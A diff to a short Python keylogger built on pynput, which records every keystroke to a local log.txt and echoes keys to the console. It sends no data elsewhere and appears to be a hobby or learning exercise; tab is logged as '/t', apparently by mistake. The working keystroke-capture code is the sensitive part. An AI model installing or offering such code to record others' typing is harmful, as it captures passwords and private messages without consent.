@@ -2,37 +2,37 @@ import pynput
 from pynput.keyboard import Key,Listener
 import datetime
 
-
-keys = []
-
-
 def create_file():
+    
     try:
         with open("log.txt","x") as f:
-            f.write(f"{str(datetime.datetime.now)}")
+            f.write(f"Created {str(datetime.date.today())}\n")
     except FileExistsError:
         print(f"File already exists.")
+        with open("log.txt","a") as f:
+            f.write(f"\nLog started at {str(datetime.datetime.now())}\n")
 
 def on_press(key):
-    keys.append(key)
-    write_file(keys)
-
+    
+    write_file(key)
     try:
         print("key {0} pressed".format(key.char))
     except AttributeError:
         print("special key {0}".format(key))
 
-def write_file(keys):
-
+def write_file(key):
+    
     with open("log.txt","a") as f:
-        for key in keys:
-
-            k = str(key).replace("'","")
-            if key == Key.enter:
-                f.write("\n")
-            elif key == Key.space:
-                k = str(key).replace("Key.space"," ")
-            f.write(k)
+        if key == Key.enter:
+            f.write("\n")
+        elif key == Key.space:
+            f.write(" ")
+        elif key == Key.tab:
+            f.write("/t ")
+        elif hasattr(key, "char") and key.char is not None:
+            f.write(key.char)
+        else:
+            f.write(f"[{key}]")
 
 def on_release(key):
 
@@ -42,7 +42,5 @@ def on_release(key):
     
 create_file()
 
-with Listener(on_press=on_press,
-              on_release= on_release) as listener:
+with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
-    
